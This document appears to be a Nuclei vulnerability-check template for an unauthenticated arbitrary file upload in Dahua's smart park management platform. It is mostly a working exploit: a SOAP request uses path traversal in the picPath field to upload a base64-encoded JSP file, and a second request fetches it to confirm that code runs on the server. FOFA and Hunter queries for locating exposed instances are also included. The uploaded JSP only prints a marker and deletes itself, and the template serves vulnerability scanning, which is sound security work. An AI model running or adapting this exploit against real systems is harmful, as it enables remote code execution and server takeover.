id: dahua-wpms-webservice-gis-soap-bitmap-fileupload
info:
  name: 大华智慧园区综合管理平台 /emap/webservice/gis/soap/bitmap - 任意文件上传漏洞
  author: leadlife
  severity: critical
  description: Dahua Smart Parking Management是中国大华（Dahua）公司的一个停车解决方案。大华智慧园区综合管理平台是一款综合管理平台，具备园区运营、资源调配和智能服务等功能。平台意在协助优化园区资源分配，满足多元化的管理需求，同时通过提供智能服务，增强使用体验。大华智慧园区综合管理平台bitmap接口存在任意文件上传漏洞，但未在上传的文件类型、大小、格式、路径等方面进行严格的限制和过滤，导致远程未授权攻击者可利用此漏洞上传任意文件，最终获取服务器权限。
  metadata:
    verified: true
    fofa-qeury: app="dahua-智慧园区综合管理平台"
    hunter-query: app.name="Dahua 大华 智慧园区管理平台"
  tags: dahua,fileupload,wpms

variables: 
  num: '{{rand_int(800000000, 1000000000)}}'

http:
  - raw:
      - |
        POST /emap/webservice/gis/soap/bitmap HTTP/1.1
        Host: {{Hostname}}
        Content-Type: text/xml; charset=utf-8
        Content-Length: 500

        <soapenv:Envelope xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/" xmlns:res="http://response.webservice.bitmap.mapbiz.emap.dahuatech.com/">
        <soapenv:Header/>
        <soapenv:Body>
        <res:uploadPicFile><arg0><picPath>/../{{num}}.jsp</picPath></arg0><arg1>PCVvdXQucHJpbnQoIjhhYWYwZjlhNmRiNzFiYmNiOWQ4YjA5NmQ1YWJmM2YzIik7bmV3IGphdmEuaW8uRmlsZShhcHBsaWNhdGlvbi5nZXRSZWFsUGF0aChyZXF1ZXN0LmdldFNlcnZsZXRQYXRoKCkpKS5kZWxldGUoKTslPg==</arg1></res:uploadPicFile>
        </soapenv:Body>
        </soapenv:Envelope>

      - |
        GET /upload/{{num}}.jsp HTTP/1.1
        Host: {{Hostname}}

    matchers:
      - type: dsl
        dsl:
          - 'status_code_1 == 200 && status_code_2 == 200'
          - 'contains(body_2,"8aaf0f9a6db71bbcb9d8b096d5abf3f3")'
        condition: and
